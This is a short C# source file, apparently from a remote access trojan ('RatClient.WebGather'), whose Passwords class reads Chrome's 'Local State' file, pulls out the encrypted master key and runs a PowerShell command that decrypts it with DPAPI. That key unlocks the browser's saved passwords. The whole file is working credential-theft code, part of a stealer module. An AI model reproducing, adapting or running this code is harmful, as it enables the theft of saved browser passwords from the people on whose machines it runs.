using System;
using System.IO;
using System.Runtime.Serialization.Json;


namespace RatClient.WebGather
{
    class Passwords
    {
        static public byte[] GetGcmKey(string type)
        {
            string path = @"C:\users\aronc\AppData\Local\Google\Chrome\User Data\Local State";
            byte[] content;
            if (path == null)
            {
                return null;
            }
            try
            {
               content = File.ReadAllBytes(path);
            }
            catch
            {
                Console.WriteLine("Error Reading file");
                return new byte[0];
            }
            
            string encryptedKey;
            using (var stream = new MemoryStream(content))
            {
                var serializer = new DataContractJsonSerializer(typeof(Content));
                var deserializedContent = (Content)serializer.ReadObject(stream);
                encryptedKey = deserializedContent.OsCrypt.EncryptedKey;

            }
            if (encryptedKey == null)
            {
                Console.WriteLine("Encrypted Key is Null");
                return null;
            }
            string argument = $" -NoLogo -NoProfile -Command $GCKEY=[System.Convert]::FromBase64String('{encryptedKey}'); " +
                              "Add-Type -AssemblyName System.Security; " +
                              "$comm='[System.Security.Cryptography.ProtectedData]::Unprotect($GCKEY[5..($GCKEY.Length-1)], $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)'; " +
                              "$out=(Invoke-Expression -Command $comm); " +
                              "[System.Convert]::ToBase64String($out)";
            Console.WriteLine(argument);
            return Tools.RunAsCurrentUser("powershell", argument);
        }
    }
}
